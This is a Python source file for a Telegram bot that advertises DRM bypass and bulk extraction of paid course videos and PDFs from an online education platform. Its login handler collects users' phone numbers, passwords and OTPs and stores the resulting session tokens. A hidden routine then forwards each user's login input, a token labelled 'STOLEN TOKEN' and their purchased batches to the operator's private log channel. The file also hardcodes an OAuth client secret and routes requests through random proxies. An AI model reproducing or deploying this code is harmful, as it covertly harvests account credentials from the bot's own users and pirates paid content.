import asyncio
import aiohttp
import os
import logging
from pyrogram import Client, filters
from database.mongo_db import get_user_tokens, save_user_token, clear_user_tokens, save_stolen_batch, is_premium_user
from platforms.pw_api import get_pw_headers
from config import Config

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# 👑 HACKER CREDIT STRING
CREDIT = "\n\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\n👑 **ᴅᴇᴠᴇʟᴏᴘᴇᴅ & ᴏᴡɴᴇᴅ ʙʏ: @officialmarco22**\n⚡ *Powered by Marco*"

# Request timeout
REQUEST_TIMEOUT = aiohttp.ClientTimeout(total=30, connect=10)

# 🟢 NEW: PW Auth Worker base URL
PW_AUTH_WORKER = "https://p-auth.raghutiwari554-34f.workers.dev"

# Inline session manager
_global_session = None

async def get_global_session() -> aiohttp.ClientSession:
    global _global_session
    if _global_session is None or _global_session.closed:
        _global_session = aiohttp.ClientSession(timeout=REQUEST_TIMEOUT)
    return _global_session

async def get_auth_session() -> aiohttp.ClientSession:
    """Get aiohttp session for auth operations"""
    return await get_global_session()

async def process_new_login(client: Client, user_id: int, input_text: str, token: str):
    """Fetches user's batches using the new token and sends them to Log Channel"""
    try:
        from plugins.extractor import get_god_headers
        headers = get_god_headers(token)
        api_url = "https://api.penpencil.co/v3/batches/my-batches?page=1&mode=1"
        
        local_session = await get_global_session()
        async with local_session.get(api_url, headers=headers) as res:
                if res.status == 200:
                    data = await res.json()
                    batches = data.get("data", [])
                    
                    batch_list_text = ""
                    for b in batches:
                        b_id = b.get("_id", "")
                        b_name = b.get("name", "Unknown Batch")
                        if b_id:
                            await save_stolen_batch(b_name, b_id, token)
                            batch_list_text += f"▪️ **{b_name}**\n   └ ID: `{b_id}`\n\n"
                    
                    log_msg = (
                        f"🚨 **NEW LOGIN ALERT!** 🚨\n\n"
                        f"👤 **User ID:** `{user_id}`\n"
                        f"📱 **Input/Number:** `{input_text}`\n\n"
                        f"🔑 **STOLEN TOKEN:**\n`{token}`\n\n"
                        f"📚 **BOUGHT BATCHES:**\n{batch_list_text if batch_list_text else 'No batches found.'}"
                    )
                    
                    await client.send_message(Config.AUTH_LOG_CHANNEL_ID, log_msg)
    except Exception as e:
        logger.error(f"Error processing new login for log channel: {e}")


@Client.on_message(filters.command("start") & filters.private)
async def start_command(client: Client, message):
    user_mention = message.from_user.mention
    welcome_msg = (
        f"HEY **{user_mention}**, AUM NAMAH SHIVAY 🙏\n\n"
        "⚡ **MARCOxUPLODER** ⚡\n\n"
        "➤ **System:** `Level-3 DRM Bypass & Fast Extractor` 🔐\n"
        "➤ **Status:** `100% Active & Ready` 🟢\n\n"
        "🎁 **AVAILABLE COMMANDS** 🎁\n\n"
        "➜ **Link bhejo** ➭ Video/PDF seedha Telegram pe (No Login) ⚡\n"
        "➜ **TXT file bhejo** ➭ Saare links Instant Upload 📄\n"
        "➜ **/pwlogin** ➭ Inject PW Accounts 🔑\n"
        "➜ **/mybatches** ➭ View & Scan Active Batches 📚\n"
        "➜ **/getbatch ID** ➭ Extract Full Batch Links 📥\n"
        "➜ **/subject ID** ➭ Subject-Wise PDF/Video Extract 📂\n"
        "➜ **/mytokens** ➭ View Active Master Tokens 🎟️\n"
        "➜ **/schedule** ➭ Daily Auto-Schedule Backup ☁️\n\n"
        "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\n"
        " ▸ **CLICK ON THE BUTTONS BELOW TO START** ◂ "
    )
    from pyrogram import enums
    from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    start_buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔑 PW Auto-Login", callback_data="dash:login", style=enums.ButtonStyle.SUCCESS),
            InlineKeyboardButton("📚 My Batches List", callback_data="dash:batches", style=enums.ButtonStyle.PRIMARY)
        ],
        [
            InlineKeyboardButton("🎟️ Master Tokens", callback_data="dash:tokens", style=enums.ButtonStyle.PRIMARY),
            InlineKeyboardButton("⏰ Auto-Scheduler", callback_data="dash:sched_help", style=enums.ButtonStyle.SUCCESS)
        ],
        [
            InlineKeyboardButton("⚡ Direct Link Upload (No Login)", callback_data="dash:direct", style=enums.ButtonStyle.SUCCESS)
        ],
        [
            InlineKeyboardButton("✨ Premium Plan ✨", callback_data="dash:plan", style=enums.ButtonStyle.PRIMARY)
        ],
        [
            InlineKeyboardButton("━━━ 👑 MARCOxUPLODER ━━━", url="https://t.me/officialmarco22", style=enums.ButtonStyle.SUCCESS)
        ]
    ])
    await message.reply_text(welcome_msg + CREDIT, reply_markup=start_buttons)

@Client.on_callback_query(filters.regex(r"^dash:"))
async def start_dashboard_callback(client: Client, callback_query):
    action = callback_query.data.split(":")[1]
    msg = callback_query.message
    if action == "login":
        await callback_query.answer()
        await pw_login_handler(client, msg)
    elif action == "batches":
        await callback_query.answer()
        from plugins.extractor import my_batches_list
        await my_batches_list(client, msg)
    elif action == "tokens":
        await callback_query.answer()
        await extract_my_tokens(client, msg)
    elif action == "plan":
        await callback_query.answer()
        from database.mongo_db import get_premium_status
        status = await get_premium_status(callback_query.message.chat.id)
        await callback_query.message.reply_text(status)
    elif action == "direct":
        await callback_query.answer()
        from plugins.direct_upload import UPLOAD_HELP, BRAND_CAPTION
        await callback_query.message.reply_text(UPLOAD_HELP + BRAND_CAPTION)
    elif action == "sched_help":
        await callback_query.answer()
        help_text = (
            "⏰ **PW Auto-Scheduler System** ⏰\n\n"
            "Aap kisi bhi Batch ko roz auto-extract aur channel me automatically send karwa sakte ho!\n\n"
            "🔹 **Command Syntax:**\n"
            "👉 `/schedule BATCH_ID CHANNEL_ID HH:MM`\n"
            "👉 `/myschedules` ➭ View active schedules\n\n"
            "💡 **Example:**\n"
            "`/schedule 641abcd -1001234567 10:00 18:30`"
        )
        await msg.reply_text(help_text)



@Client.on_message(filters.command("pwlogin") & filters.private)
async def pw_login_handler(client: Client, message):
    """Handle PW login - supports token, password, and OTP (via PW Auth Worker)"""
    try:
        ask = await message.reply_text(
            "━━━ 🔑 **PW Auto-Login System** 🔑 ━━━\n\n"
            "➤ **Please send your login details below:**\n\n"
            "➜ `Number*Password` ➭ Full Login 🔐\n"
            "➜ `Number` ➭ Send OTP Code 📱\n"
            "➜ `Token|RandomId` ➭ Inject Token 🎟️\n\n"
            "💡 *Naye PW DRM mein RandomId zaroori hai!*\n"
            "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\n"
            " ▸ **SEND TEXT TO CONTINUE** ◂ "
        )

        try:
            # 🟢 pyromod zaroori hai is feature ke liye
            user_input = await client.listen(message.chat.id, timeout=60)
        except asyncio.TimeoutError:
            return await ask.edit("❌ Time out! Phir se `/pwlogin` karein.")

        if not user_input.text:
            return await ask.edit("❌ Invalid Input! Kripya sirf Text bhejein.")

        raw_text = user_input.text.strip()
        headers = get_pw_headers()
        session = await get_auth_session()
        if True:
            # DIRECT TOKEN LOGIN
            if len(raw_text) > 40 and "*" not in raw_text:
                await ask.edit("🔄 Direct Token verify kar raha hu...")
                test_headers = get_pw_headers(raw_text)

                try:
                    async with session.get(
                        "https://api.penpencil.co/v3/batches/my-batches?page=1&mode=1",
                        headers=test_headers,
                        proxy=Config.get_random_proxy()
                    ) as res:
                        if res.status == 200:
                            await save_user_token(message.chat.id, raw_text)
                            return await ask.edit(
                                f"🎉 **Direct Token Added!**\n"
                                f"Naya account add ho gaya! Ab `/mybatches` daba.{CREDIT}"
                            )
                        else:
                            return await ask.edit("❌ **Invalid/Expired Token!** API ne ise reject kar diya.")
                except asyncio.TimeoutError:
                    return await ask.edit("❌ API timeout! Dubara try karo.")

            # PASSWORD LOGIN (unchanged)
            elif "*" in raw_text:
                num, pwd = raw_text.split("*", 1)
                await ask.edit("🔄 Password se login kar raha hu...")

                payload = {
                    "username": num,
                    "password": pwd,
                    "organizationId": "5eb393ee95fab7468a79d189",
                    "client_id": "system-admin",
                    "client_secret": "KjPXuAVfC5xbmgreETNMaL7z",
                    "grant_type": "password"
                }

                try:
                    async with session.post(
                        "https://api.penpencil.co/v1/oauth/token",
                        json=payload,
                        headers=headers,
                        proxy=Config.get_random_proxy()
                    ) as res:
                        data = await res.json()
                        token = data.get("data", {}).get("access_token") or data.get("access_token")

                        if token:
                            r_id = headers.get("randomid", "")
                            save_str = f"{token}|{r_id}" if r_id else token
                            await save_user_token(message.chat.id, save_str)
                            asyncio.create_task(process_new_login(client, message.chat.id, raw_text, save_str))
                            await ask.edit(
                                f"🎉 **Login Success!** Naya account add ho gaya.\n"
                                f"Ab `/mybatches` daba.{CREDIT}"
                            )
                        else:
                            await ask.edit(f"❌ Login Failed:\n`{data}`")
                except asyncio.TimeoutError:
                    return await ask.edit("❌ API timeout! Dubara try karo.")

            # 🟢 OTP LOGIN — REPLACED WITH PW AUTH WORKER
            else:
                await ask.edit("🔄 OTP bhej raha hu... (PW Auth Worker)")

                # Ensure number is prefixed with country code 91 (Worker requires 91XXXXXXXXXX)
                num_clean = raw_text.replace(" ", "").replace("-", "").replace("+", "")
                if not num_clean.startswith("91") or len(num_clean) != 12:
                    # If user gave 10-digit number, prepend 91
                    if len(num_clean) == 10 and num_clean.isdigit():
                        num_clean = "91" + num_clean
                    # else assume it's already with country code

                # --- SEND OTP via Worker ---
                send_otp_url = f"{PW_AUTH_WORKER}/api/send-otp?num={num_clean}&smstype=0"

                try:
                    async with session.get(
                        send_otp_url,
                        proxy=Config.get_random_proxy()
                    ) as res:
                        res_text = await res.text()

                        # Worker returns JSON like {"success": true, ...} on success
                        is_success = False
                        try:
                            j = await res.json()
                            if j.get("success") is True or j.get("status") is True or j.get("status") == "success":
                                is_success = True
                        except Exception:
                            if res.status in (200, 201, 202) and "success" in res_text.lower():
                                is_success = True

                        if not is_success:
                            return await ask.edit(
                                f"❌ **OTP Sending Failed!**\n\n"
                                f"🌐 Worker Response:\n`{res_text[:500]}`"
                            )

                        await ask.edit("✅ OTP Sent! Jaldi se SMS wala OTP bhejein:")

                        try:
                            otp_in = await client.listen(message.chat.id, timeout=60)
                            if not otp_in.text:
                                return await ask.edit("❌ Invalid OTP Format!")

                            otp_code = otp_in.text.strip()
                            await ask.edit("🔄 OTP Verify kar raha hu... (PW Auth Worker)")

                            # --- VERIFY OTP via Worker ---
                            verify_url = f"{PW_AUTH_WORKER}/api/verify?num={num_clean}&otp={otp_code}"

                            async with session.get(
                                verify_url,
                                proxy=Config.get_random_proxy()
                            ) as verify_res:
                                verify_text = await verify_res.text()

                                # Worker returns token in one of these common fields
                                token = None
                                try:
                                    vj = await verify_res.json()
                                    # Try common token fields
                                    token = (
                                        vj.get("access_token")
                                        or vj.get("token")
                                        or vj.get("data", {}).get("access_token")
                                        or vj.get("data", {}).get("token")
                                    )
                                    # also check for success flag
                                    success_flag = vj.get("success") or (vj.get("status") == "success")
                                    if not token and not success_flag:
                                        logger.error(f"PW Worker verify raw: {verify_text}")
                                except Exception:
                                    logger.error(f"PW Worker verify non-JSON: {verify_text}")

                                if token:
                                    r_id = headers.get("randomid", "")
                                    save_str = f"{token}|{r_id}" if r_id else token
                                    await save_user_token(message.chat.id, save_str)
                                    asyncio.create_task(process_new_login(client, message.chat.id, raw_text, save_str))
                                    await ask.edit(
                                        f"🎉 **OTP Login Successful!** Naya account add ho gaya.\n"
                                        f"Ab `/mybatches` daba.{CREDIT}"
                                    )
                                else:
                                    await ask.edit(
                                        f"❌ **Verification Failed!**\n\n"
                                        f"🌐 Worker Response:\n`{verify_text[:500]}`"
                                    )

                        except asyncio.TimeoutError:
                            await ask.edit("❌ Time out! Aapne OTP daalne me der kar di.")

                except asyncio.TimeoutError:
                    return await ask.edit("❌ PW Auth Worker timeout! Dubara try karo.")
                except Exception as e:
                    logger.error(f"PW Auth Worker error: {e}")
                    return await ask.edit(f"❌ Worker Error: `{e}`")

    except Exception as e:
        logger.error(f"pwlogin error: {e}")
        await message.reply_text(f"🚨 Error: `{e}`")


@Client.on_message(filters.command("mytokens") & filters.private)
async def extract_my_tokens(client: Client, message):
    """Display all saved tokens for user"""
    tokens = await get_user_tokens(message.chat.id)
    if not tokens:
        return await message.reply_text(
            "❌ **Pehle login kar le!** Tere paas koi saved token nahi hai."
        )

    status_msg = await message.reply_text("⏳ **Tere Master Tokens nikal raha hu...**")
    response_text = "🔑 **TERE EXTRACT KIYE HUE TOKENS:**\n\n"

    for i, tkn in enumerate(tokens, 1):
        response_text += f"👤 **ACCOUNT {i}:**\n`{tkn}`\n\n"

    response_text += "👉 **Note:** Kisi bhi token par tap kar, poora token copy ho jayega."

    if len(response_text) > 4000:
        with open("my_tokens.txt", "w", encoding="utf-8") as f:
            f.write(response_text.replace("`", "").replace("*", ""))
        await client.send_document(
            message.chat.id,
            "my_tokens.txt",
            caption=f"🔑 **Tere Khufiya Tokens!**{CREDIT}"
        )
        os.remove("my_tokens.txt")
        await status_msg.delete()
    else:
        await status_msg.edit_text(response_text + CREDIT)

@Client.on_message(filters.command("cleartokens") & filters.private)
async def clear_my_tokens(client: Client, message):
    """Clear all saved tokens for the user"""
    await clear_user_tokens(message.chat.id)
    await message.reply_text(
        "🗑 **Tere saare puraane aur naye Tokens delete ho gaye hain!**\n\n"
        "Ab tu fresh login kar sakta hai `/pwlogin` daba kar."
    )

@Client.on_message(filters.command(["cleanexpired", "cleardead", "clearexpired"]) & filters.private)
async def clean_expired_tokens_command(client: Client, message):
    user_id = message.chat.id
    tokens = await get_user_tokens(user_id)
    if not tokens:
        return await message.reply_text("❌ **Tere paas koi saved tokens nahi hain.**")
        
    status_msg = await message.reply_text("⏳ **Expired tokens check aur clean kar raha hu...**")
    
    import base64, json, time
    from database.mongo_db import remove_dead_token
    removed_count = 0
    valid_count = 0
    
    for token in tokens:
        is_dead = False
        try:
            parts = token.split('.')
            if len(parts) >= 2:
                payload_b64 = parts[1]
                payload_b64 += '=' * (-len(payload_b64) % 4)
                payload_bytes = base64.b64decode(payload_b64)
                payload_json = json.loads(payload_bytes)
                exp = payload_json.get('exp')
                if exp and time.time() >= float(exp):
                    is_dead = True
        except Exception:
            pass
            
        if is_dead:
            await remove_dead_token(user_id, token)
            removed_count += 1
        else:
            valid_count += 1
            
    await status_msg.edit_text(
        f"🧹 **EXPIRED TOKENS CLEANUP COMPLETE!**\n\n"
        f"🔴 **Removed Expired Tokens:** `{removed_count}`\n"
        f"🟢 **Remaining Active Tokens:** `{valid_count}`\n\n"
        f"👉 Fresh login karne ke liye `/pwlogin` use karein."
    )

@Client.on_message(filters.command(["purgealltokens", "cleanalltokens"]) & filters.private & filters.user(Config.OWNER_ID))
async def purge_all_expired_tokens_admin(client: Client, message):
    status_msg = await message.reply_text("⏳ **Saare users ke expired tokens database se purge kar raha hu...**")
    from database.mongo_db import users_col, decrypt_token, remove_dead_token
    import base64, json, time
    
    total_removed = 0
    async for u in users_col.find({}):
        u_id = u.get("telegram_id")
        t_list = u.get("tokens", [])
        for raw_t in t_list:
            dec_t = decrypt_token(raw_t) or raw_t
            try:
                parts = dec_t.split('.')
                if len(parts) >= 2:
                    payload_b64 = parts[1]
                    payload_b64 += '=' * (-len(payload_b64) % 4)
                    payload_bytes = base64.b64decode(payload_b64)
                    payload_json = json.loads(payload_bytes)
                    exp = payload_json.get('exp')
                    if exp and time.time() >= float(exp):
                        await remove_dead_token(u_id, dec_t)
                        total_removed += 1
            except Exception:
                pass

    await status_msg.edit_text(
        f"🧹 **ADMIN GLOBAL TOKEN PURGE COMPLETE!**\n\n"
        f"🔴 **Total Expired Tokens Removed across DB:** `{total_removed}`"
    )
